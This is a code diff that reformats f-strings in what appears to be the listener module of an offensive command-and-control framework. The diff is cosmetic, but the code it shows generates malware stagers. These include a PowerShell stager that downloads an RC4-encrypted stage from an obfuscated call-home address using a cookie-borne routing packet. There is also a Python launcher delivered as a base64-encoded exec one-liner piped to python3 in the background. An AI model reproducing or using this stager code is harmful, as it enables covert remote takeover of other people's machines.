@@ -149,7 +149,7 @@ class Listener:
 
             if user_agent.lower() == "default":
                 user_agent = profile.split("|")[1]
-            stager += f"$u='{ user_agent }';"
+            stager += f"$u='{user_agent}';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
@@ -166,7 +166,7 @@ class Listener:
                     else:
                         # TODO: implement form for other proxy
                         stager += "$proxy=New-Object Net.WebProxy;"
-                        stager += f"$proxy.Address = '{ proxy.lower() }';"
+                        stager += f"$proxy.Address = '{proxy.lower()}';"
                         stager += "$wc.Proxy = $proxy;"
 
                     if proxy_creds.lower() == "default":
@@ -184,7 +184,7 @@ class Listener:
             # TODO: reimplement stager retries?
 
             # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
@@ -201,8 +201,8 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
             # add the RC4 packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
-            stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listener_name }';"
+            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
+            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listener_name}';"
             stager += "$data=$wc.DownloadData($ser+$t);"
             stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
@@ -252,7 +252,7 @@ class Listener:
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ user_agent }';server='{ host }';t='{ stage0 }';hop='{ listener_name }';
+                UA='{user_agent}';server='{host}';t='{stage0}';hop='{listener_name}';
                 req=urllib.request.Request(server+t);
                 """
             )
@@ -273,23 +273,23 @@ class Listener:
                     launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                 else:
                     proto = proxy.split(":")[0]
-                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
+                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"
 
                 if proxy_creds != "none":
                     if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
                         # add the RC4 packet to a cookie
-                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
+                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
                     else:
                         username = proxy_creds.split(":")[0]
                         password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
                             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
-                            proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
+                            proxy_auth_handler.add_password(None,'{proxy}','{username}','{password}');
                             o = urllib.request.build_opener(proxy, proxy_auth_handler);
-                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
+                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={b64RoutingPacket}")];
                             """
                         )
                 else:
@@ -313,7 +313,7 @@ class Listener:
                 launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                     "UTF-8"
                 )
-                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
             return launcherBase
 
         log.error(
@@ -391,7 +391,7 @@ class Listener:
                     remove += value
                 headers = ",".join(remove)
                 stager = stager.replace(
-                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
+                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
 
             staging_key = staging_key.encode("UTF-8")
